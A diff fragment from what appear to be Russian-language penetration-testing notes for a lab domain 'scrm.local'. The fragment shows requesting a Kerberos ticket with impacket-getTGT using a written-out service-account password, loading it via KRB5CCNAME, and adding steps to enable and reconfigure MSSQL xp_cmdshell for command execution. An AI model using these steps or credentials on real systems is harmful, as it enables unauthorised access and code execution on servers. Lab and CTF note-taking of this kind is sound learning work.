@@ -89,8 +89,12 @@ impacket-getTGT scrm.local/sqlsvc:Pegasus60
 export KRB5CCNAME=sqlsvc.ccache
 
 или по TGS - также но с генерацией TGS
+---Включить вполнени xp_cmdshell
 
 enable_xp_cmdshell
+
+reconfigure
+
 xp_cmdshell
 
 ********************
